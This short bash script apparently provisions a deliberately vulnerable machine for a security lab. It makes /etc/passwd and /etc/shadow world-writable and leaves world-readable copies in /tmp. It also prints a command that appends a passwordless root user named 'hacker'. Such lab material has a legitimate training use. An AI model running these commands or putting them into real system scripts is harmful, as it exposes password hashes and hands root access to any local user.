#!/bin/bash
# vuln: writable_passwd_shadow | severity: critical
echo "[VULN] Making /etc/passwd and /etc/shadow writable..."
chmod 666 /etc/passwd
chmod 666 /etc/shadow
cp /etc/passwd /tmp/passwd_backup
cp /etc/shadow /tmp/shadow_backup
chmod 644 /tmp/passwd_backup
chmod 644 /tmp/shadow_backup
echo "[VULN] /etc/passwd and /etc/shadow are world-writable."
echo "[INFO] Add user: echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd"
